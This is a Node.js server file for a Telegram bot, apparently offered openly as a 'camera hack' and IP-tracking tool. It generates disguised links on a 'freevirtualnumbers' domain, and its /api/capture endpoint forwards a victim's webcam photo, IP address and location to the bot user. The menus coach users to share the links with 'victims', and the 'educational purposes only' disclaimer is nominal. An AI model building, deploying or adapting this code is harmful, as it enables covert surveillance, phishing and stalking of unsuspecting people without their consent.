// server.js - Enhanced Pro System v4.0
const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const axios = require("axios");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ===== Middleware =====
app.use(bodyParser.json({ limit: "20mb" }));
app.use(express.static(path.join(__dirname, "public")));

// ===== CONFIG =====
const DOMAIN = "https://freevirtualnumbers.onrender.com";
const CHANNEL_USERNAME = "@devxtechzone";
const OWNER_ID = 6170894121;
const users = new Set();
const userStats = new Map(); // Track user activity

// ===== User Tracking =====
const activeUsers = {};
const TOKEN_EXPIRY_MS = 10 * 60 * 1000;

setInterval(() => {
  const now = Date.now();
  for (const token in activeUsers) {
    if (now - activeUsers[token].createdAt > TOKEN_EXPIRY_MS) {
      delete activeUsers[token];
    }
  }
}, 2 * 60 * 1000);

function generateToken() {
  return crypto.randomBytes(8).toString("hex");
}

// ===== Force Join Check =====
async function isUserJoined(ctx) {
  try {
    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, ctx.from.id);
    return ["creator", "administrator", "member"].includes(member.status);
  } catch {
    return false;
  }
}

// ===== Enhanced Main Menu =====
function mainMenu() {
  return Markup.inlineKeyboard([
    [
      Markup.button.callback("🎱 POOL MODE", "pool"),
      Markup.button.callback("⚡ NORMAL MODE", "normal")
    ],
    [
      Markup.button.callback("📸 CAMERA HACK", "camera_hack"),
      Markup.button.callback("📍 IP TRACKER", "ip_tracker")
    ],
    [
      Markup.button.callback("📊 STATS", "stats"),
      Markup.button.callback("💬 CHAT DEV", "chat_dev")
    ],
    [
      Markup.button.callback("👤 PROFILE", "profile"),
      Markup.button.callback("ℹ️ HELP", "help_info")
    ],
    [
      Markup.button.url("🌐 SUPPORT", "https://t.me/Mrddev"),
      Markup.button.url("📢 CHANNEL", "https://t.me/devxtechzone")
    ],
    [
      Markup.button.callback("👨‍💻 DEV", "dev"),
      Markup.button.callback("🆔 MY ID", "my_id")
    ]
  ]);
}

// ===== Stylish Welcome Message =====
async function sendWelcome(ctx) {
  const user = ctx.from;
  const stats = userStats.get(ctx.from.id) || { joins: 0, lastSeen: null };
  stats.joins++;
  stats.lastSeen = new Date();
  userStats.set(ctx.from.id, stats);

  await ctx.replyWithPhoto(
    "https://files.catbox.moe/v75lmb.jpeg",
    {
      caption: `
╔══════════════════════╗
║  🔱 PRO SYSTEM v4.0  ║
║  ⚡ ELITE EDITION    ║
╚══════════════════════╝

✨ <b>WELCOME BACK, ${user.first_name}!</b>

📊 <b>Your Stats:</b>
• Total Visits: ${stats.joins}
• User ID: <code>${user.id}</code>

━━━━━━━━━━━━━━━━━━
🎯 <b>Select a module below</b>
━━━━━━━━━━━━━━━━━━
`,
      parse_mode: "HTML",
      ...mainMenu()
    }
  );
}

// ===== Middleware to lock all commands until join =====
bot.use(async (ctx, next) => {
  if (!ctx.from || !ctx.chat || ctx.chat.type === "channel") return;

  if (ctx.callbackQuery && ctx.callbackQuery.data === "check_join") return next();

  const joined = await isUserJoined(ctx);
  if (!joined) {
    return ctx.telegram.sendMessage(ctx.from.id, `
╔══════════════════════╗
║  🚫 ACCESS LOCKED    ║
╚══════════════════════╝

🔐 <b>You must join our channel</b>

<i>Why join?</i>
✨ Exclusive updates
🎁 Free tools & tricks
💎 Premium content

👇 <b>Click below to join</b>
`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📢 JOIN CHANNEL", url: "https://t.me/devxtechzone" }],
          [{ text: "✅ I JOINED", callback_data: "check_join" }]
        ]
      }
    });
  }
  return next();
});

// ===== START =====
bot.start(async (ctx) => {
  users.add(ctx.from.id);
  await sendWelcome(ctx);
});

// ===== Check Join Button =====
bot.action("check_join", async (ctx) => {
  const joined = await isUserJoined(ctx);
  if (!joined) {
    return ctx.answerCbQuery("❌ Join channel first!", { show_alert: true });
  }
  await ctx.answerCbQuery("✅ Access Granted! 🎉");
  await ctx.deleteMessage();
  await sendWelcome(ctx);
});

// ===== Pool Mode =====
bot.action("pool", async (ctx) => {
  await ctx.answerCbQuery();
  const token = generateToken();
  activeUsers[token] = {
    chat_id: ctx.chat.id,
    username: ctx.from.username,
    createdAt: Date.now(),
    mode: "pool"
  };

  const msg = await ctx.reply("🎱 <b>Initializing Pool Mode...</b>", { parse_mode: "HTML" });
  await new Promise(r => setTimeout(r, 1500));

  await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `
╔══════════════════════╗
║  🎱 POOL MODE ACTIVE ║
╚══════════════════════╝

🔗 <b>Your Tracking Link:</b>
<code>${DOMAIN}?token=${token}</code>

⏱️ <b>Expires in:</b> 10 minutes
📊 <b>Status:</b> Ready

<i>Share this link to track</i>
`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [Markup.button.callback("📋 COPY LINK", `copy_${token}`)],
      [Markup.button.callback("◀️ BACK", "back")]
    ])
  });
});

// ===== Normal Mode =====
bot.action("normal", async (ctx) => {
  await ctx.answerCbQuery();
  const token = generateToken();
  activeUsers[token] = {
    chat_id: ctx.chat.id,
    username: ctx.from.username,
    createdAt: Date.now(),
    mode: "normal"
  };

  const msg = await ctx.reply("⚡ <b>Preparing Normal Mode...</b>", { parse_mode: "HTML" });
  await new Promise(r => setTimeout(r, 1500));

  await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `
╔══════════════════════╗
║ ⚡ NORMAL MODE READY ║
╚══════════════════════╝

🔗 <b>Your Tracking Link:</b>
<code>${DOMAIN}?token=${token}</code>

⏱️ <b>Expires in:</b> 10 minutes
📸 <b>Features:</b> Camera + IP + Location

<i>Victim will be tracked instantly</i>
`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [Markup.button.callback("📋 COPY LINK", `copy_${token}`)],
      [Markup.button.callback("◀️ BACK", "back")]
    ])
  });
});

// ===== Camera Hack Guide =====
bot.action("camera_hack", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
╔══════════════════════╗
║  📸 CAMERA HACK v2.0 ║
╚══════════════════════╝

<b>How to use:</b>

1️⃣ Select <b>POOL</b> or <b>NORMAL</b> mode
2️⃣ Share the generated link
3️⃣ When victim opens → camera access requested
4️⃣ You receive photo + IP + location

⚠️ <b>Disclaimer:</b>
For educational purposes only!
Use responsibly.

<i>🔐 End-to-end encrypted</i>
`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [Markup.button.callback("🎱 START POOL MODE", "pool")],
      [Markup.button.callback("⚡ START NORMAL MODE", "normal")],
      [Markup.button.callback("◀️ BACK", "back")]
    ])
  });
});

// ===== IP Tracker =====
bot.action("ip_tracker", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
╔══════════════════════╗
║  📍 IP TRACKER PRO   ║
╚══════════════════════╝

<b>Features:</b>
🌐 Real IP address
📍 Exact location (City/Country)
📡 ISP information
🕒 Timestamp

<b>To use:</b>
• Select tracking mode
• Share generated link
• Get complete victim data

<i>⚠️ 100% anonymous</i>
`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [Markup.button.callback("🚀 START TRACKING", "normal")],
      [Markup.button.callback("◀️ BACK", "back")]
    ])
  });
});

// ===== Stats =====
bot.action("stats", async (ctx) => {
  await ctx.answerCbQuery();
  const totalUsers = users.size;
  const activeSessions = Object.keys(activeUsers).length;
  const userStatsData = userStats.get(ctx.from.id) || { joins: 1, lastSeen: new Date() };

  await ctx.reply(`
╔══════════════════════╗
║  📊 SYSTEM STATISTICS║
╚══════════════════════╝

🤖 <b>Bot Stats:</b>
• Total Users: ${totalUsers}
• Active Sessions: ${activeSessions}
• Status: 🟢 ONLINE
• Version: v4.0 ELITE

👤 <b>Your Stats:</b>
• Total Commands: ${userStatsData.joins}
• Last Active: ${userStatsData.lastSeen.toLocaleTimeString()}

⚙️ <b>System:</b>
• Uptime: Perfect
• Security: 🔒 ENCRYPTED
`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [Markup.button.callback("🔄 REFRESH", "stats")],
      [Markup.button.callback("◀️ BACK", "back")]
    ])
  });
});

// ===== Profile =====
bot.action("profile", async (ctx) => {
  const user = ctx.from;
  const stats = userStats.get(ctx.from.id) || { joins: 1 };
  
  await ctx.reply(`
╔══════════════════════╗
║  👤 USER PROFILE     ║
╚══════════════════════╝

<b>📝 Information:</b>
• Name: ${user.first_name} ${user.last_name || ''}
• Username: @${user.username || 'Not set'}
• User ID: <code>${user.id}</code>

<b>📊 Activity:</b>
• Total Visits: ${stats.joins}
• Member Since: ${new Date(ctx.message?.date * 1000 || Date.now()).toLocaleDateString()}

<b>⭐ Status:</b>
• Premium: ${stats.joins > 10 ? '✅ YES' : '❌ NO'}
• Verified: ✅

<i>🎯 Upgrade by using bot more!</i>
`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [Markup.button.callback("🆔 MY ID", "my_id")],
      [Markup.button.callback("◀️ BACK", "back")]
    ])
  });
});

// ===== Help Info =====
bot.action("help_info", async (ctx) => {
  await ctx.reply(`
╔══════════════════════╗
║  ℹ️ HELP & COMMANDS  ║
╚══════════════════════╝

<b>📋 Available Commands:</b>

/start - Launch bot
/chat - Talk with dev
/stats - View bot stats
/profile - Your profile
/id - Get your ID
/broadcast - (Owner only)

<b>🎮 Features:</b>
• Camera Hacking
• IP Tracking
• Location Detection
• Live Chat Support

<b>⚠️ Warning:</b>
Use responsibly!
Enjoy.

📞 <b>Support:</b> @Mrddev
`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [Markup.button.callback("💬 CONTACT DEV", "chat_dev")],
      [Markup.button.callback("◀️ BACK", "back")]
    ])
  });
});

// ===== Chat with Developer =====
bot.action("chat_dev", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
╔══════════════════════╗
║  💬 CHAT WITH DEV    ║
╚══════════════════════╝

<b>📨 How to use:</b>

1️⃣ Type <code>/chat</code>
2️⃣ Send your message
3️⃣ Dev will reply within minutes

<i>💡 All messages are private & secure</i>

<b>👨‍💻 Developer:</b> @Mrddev
`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [Markup.button.url("📩 MESSAGE DEV", "https://t.me/Mrddev")],
      [Markup.button.callback("◀️ BACK", "back")]
    ])
  });
});

// ===== Developer Info =====
bot.action("dev", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
╔══════════════════════╗
║  👨‍💻 DEVELOPER INFO  ║
╚══════════════════════╝

<b>🔧 Created by:</b>
• Name: Mr Dev
• Username: @Mrddev
• Role: CEO & Founder

<b>📊 Project Stats:</b>
• Version: 4.0 ELITE
• Users: ${users.size}+
• Uptime: 99.9%

<b>🌐 Links:</b>
• Channel: @devxtechzone
• Support: @Mrddev

<i>⚡ Powered by Devx tech zone</i>
`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [Markup.button.url("📢 JOIN CHANNEL", "https://t.me/devxtechzone")],
      [Markup.button.callback("◀️ BACK", "back")]
    ])
  });
});

// ===== My ID =====
bot.action("my_id", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
╔══════════════════════╗
║  🆔 YOUR TELEGRAM ID ║
╚══════════════════════╝

<b>📝 Information:</b>

• User ID: <code>${ctx.from.id}</code>
• Chat ID: <code>${ctx.chat.id}</code>

<i>💡 Save this ID for future reference</i>
`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [Markup.button.callback("📋 COPY ID", `copy_id_${ctx.from.id}`)],
      [Markup.button.callback("◀️ BACK", "back")]
    ])
  });
});

// ===== Copy handlers =====
bot.action(/copy_(.+)/, async (ctx) => {
  const data = ctx.match[1];
  if (data.startsWith('id_')) {
    const id = data.replace('id_', '');
    await ctx.answerCbQuery(`ID: ${id}`, { show_alert: true });
  } else {
    const token = data;
    const link = `${DOMAIN}?token=${token}`;
    await ctx.answerCbQuery(`Link copied!`, { show_alert: true });
    await ctx.reply(`📋 Your link:\n<code>${link}</code>`, { parse_mode: "HTML" });
  }
});

// ===== Chat System =====
const activeChats = {};

bot.command('chat', async (ctx) => {
  activeChats[ctx.chat.id] = true;
  await ctx.reply(`
╔══════════════════════╗
║  💬 CHAT MODE ACTIVE ║
╚══════════════════════╝

✅ You can now message the developer directly!

📨 <b>Instructions:</b>
• Send any message
• Dev will reply here
• Type /exit to leave

<i>⏱️ Response time: Usually within minutes</i>
`, { parse_mode: "HTML" });
});

bot.command('exit', async (ctx) => {
  if (activeChats[ctx.chat.id]) {
    delete activeChats[ctx.chat.id];
    await ctx.reply(`
╔══════════════════════╗
║  👋 CHAT MODE EXITED ║
╚══════════════════════╝

✅ You have left chat mode.
Type /chat to start again.
`, { parse_mode: "HTML" });
  } else {
    await ctx.reply("⚠️ You are not in chat mode!");
  }
});

bot.command('id', async (ctx) => {
  await ctx.reply(`🆔 Your ID: <code>${ctx.from.id}</code>`, { parse_mode: "HTML" });
});

bot.command('profile', async (ctx) => {
  const stats = userStats.get(ctx.from.id) || { joins: 1 };
  await ctx.reply(`
👤 <b>Profile:</b>
Name: ${ctx.from.first_name}
ID: <code>${ctx.from.id}</code>
Visits: ${stats.joins}
`, { parse_mode: "HTML" });
});

bot.command('stats', async (ctx) => {
  await ctx.reply(`
📊 <b>Bot Stats:</b>
Users: ${users.size}
Active: ${Object.keys(activeUsers).length}
`, { parse_mode: "HTML" });
});

// ===== Message Handler =====
bot.on('text', async (ctx) => {
  const chatId = ctx.chat.id;
  const msg = ctx.message;
  if (!msg.text || msg.text.startsWith('/')) return;

  // Owner reply system
  if (chatId === OWNER_ID && msg.reply_to_message?.text) {
    const match = msg.reply_to_message.text.match(/🆔 ID: (\d+)/);
    if (match) {
      const userId = parseInt(match[1], 10);
      try {
        await ctx.telegram.sendMessage(userId, `
💬 <b>Reply from Developer:</b>

${msg.text}

<i>🔐 This is a secure message</i>
`, { parse_mode: "HTML" });
        await ctx.reply("✅ Reply sent successfully!");
      } catch (err) {
        await ctx.reply("❌ Failed to send reply.");
      }
    }
    return;
  }

  // User to owner chat
  if (activeChats[chatId]) {
    try {
      await ctx.telegram.sendMessage(OWNER_ID, `
📨 <b>New Message from User</b>

👤 <b>Name:</b> ${msg.from.first_name} ${msg.from.last_name || ''}
🔗 <b>Username:</b> @${msg.from.username || 'None'}
🆔 <b>ID:</b> ${chatId}

💬 <b>Message:</b>
${msg.text}

✏️ <i>Reply to this message to respond</i>
`, { parse_mode: "HTML" });
      await ctx.reply("✅ Message sent to developer!");
    } catch (err) {
      await ctx.reply("❌ Failed to send message.");
    }
  }
});

// ===== Broadcast Command =====
bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only command!");
  
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) return ctx.reply("Usage: /broadcast Your message");
  
  let success = 0, failed = 0;
  for (const userId of users) {
    try {
      await bot.telegram.sendMessage(userId, `
📢 <b>ANNOUNCEMENT</b>

${message}

<i>— Admin Team</i>
`, { parse_mode: "HTML" });
      success++;
    } catch {
      failed++;
    }
  }
  ctx.reply(`✅ Broadcast: ${success} sent, ${failed} failed`);
});

// ===== Back Button =====
bot.action("back", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageCaption(`
╔══════════════════════╗
║  🔱 PRO SYSTEM v4.0  ║
║  ⚡ ELITE EDITION    ║
╚══════════════════════╝

🎯 <b>Select a module below</b>
━━━━━━━━━━━━━━━━━━
`, { parse_mode: "HTML", ...mainMenu() });
});

// ===== API Routes =====
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public/index.html"));
});

app.post("/api/capture", async (req, res) => {
  try {
    const { image, token, ip, location } = req.body;
    
    if (!image) return res.status(400).json({ error: "No image" });
    if (!token || !activeUsers[token]) return res.status(400).json({ error: "Invalid token" });
    
    const chat_id = activeUsers[token].chat_id;
    const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
    
    await bot.telegram.sendPhoto(chat_id, { source: buffer }, {
      caption: `
╔══════════════════════╗
║  📸 CAMERA HACKED!   ║
╚══════════════════════╝

🌐 <b>IP Address:</b> ${ip}
📍 <b>Location:</b> ${location}
🕐 <b>Time:</b> ${new Date().toLocaleString()}

<i>🔐 Target captured successfully</i>
`,
      parse_mode: "HTML"
    });
    
    res.json({ status: "success" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

// ===== Start Server =====
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
bot.launch().then(() => console.log("🤖 Telegram bot running"));
console.log("✨ Pro System v4.0 ELITE is LIVE!");
